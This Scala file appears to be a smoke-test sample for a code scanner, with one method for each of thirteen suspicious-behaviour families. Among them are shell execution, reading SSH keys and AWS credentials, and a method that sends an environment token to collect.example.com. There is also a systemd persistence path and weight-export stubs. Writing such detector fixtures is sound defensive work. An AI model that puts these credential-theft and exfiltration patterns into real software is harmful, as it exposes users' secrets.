// Smoke sample for the Scala pack: every one of the thirteen TAA families fires
// at least once below, and nothing fires in negative.scala.
package com.example

import java.io.{File, FileInputStream, ObjectInputStream}
import java.net.{DatagramSocket, Socket, URL}
import java.nio.channels.SocketChannel
import java.nio.file.{Files, Paths}
import java.util.Base64
import scala.io.Source
import scala.reflect.runtime.universe.runtimeMirror
import scala.sys.process._

object Suspicious {

  def cmdExec(): Unit = {
    val listing = "ls -la /etc".!
    val identity = s"id -un".!!
  }

  def cmdExecProcess(): Unit = {
    val probe = Process("id")
    val shell = new ProcessBuilder("sh", "-c", "id")
  }

  def netGeneral(endpoint: String): Unit = {
    val feed = Source.fromURL("http://collect.example.com/beacon")
    val body = new URL(endpoint).openStream()
    client.send(request, handler)
  }

  def netSocket(host: String): Unit = {
    new Socket(host, 4444)
    new DatagramSocket(4444)
    SocketChannel.open(address)
  }

  def dynEval(name: String): Any = {
    val clazz = Class.forName(name)
    val mirror = runtimeMirror(getClass.getClassLoader)
    handler.invoke(target)
  }

  def filProbe(): Unit = {
    val key = Source.fromFile("/home/deploy/.ssh/id_rsa")
    val credentials = Paths.get(home, ".aws", "credentials")
  }

  def envSecret(): String = {
    val token = sys.env("GITHUB_TOKEN")
    token
  }

  def obfExec(payload: String): Array[Byte] = {
    val raw = Base64.getDecoder().decode(payload)
    raw
  }

  def exfiltrate(): Unit = {
    val token = sys.env("API_TOKEN")
    val endpoint = "https://collect.example.com/?t=" + token
    Source.fromURL(endpoint)
  }

  def persist(): Unit = {
    val unit = "/etc/systemd/system/agent.service"
    sys.addShutdownHook(beacon())
  }

  def embDataDump(out: java.nio.file.Path, raw_data: Array[Byte]): Unit = {
    Files.write(out, raw_data)
  }

  def embCopyExport(src: java.nio.file.Path, exportDir: java.nio.file.Path): Unit = {
    Files.copy(src, exportDir)
  }

  def embLogDump(raw_data: Array[Byte]): Unit = {
    println(raw_data)
  }

  def embStegoWeight(weights: Array[Byte]): Unit = {
    val encodedWeights = Base64.getEncoder.encodeToString(weights)
  }
}
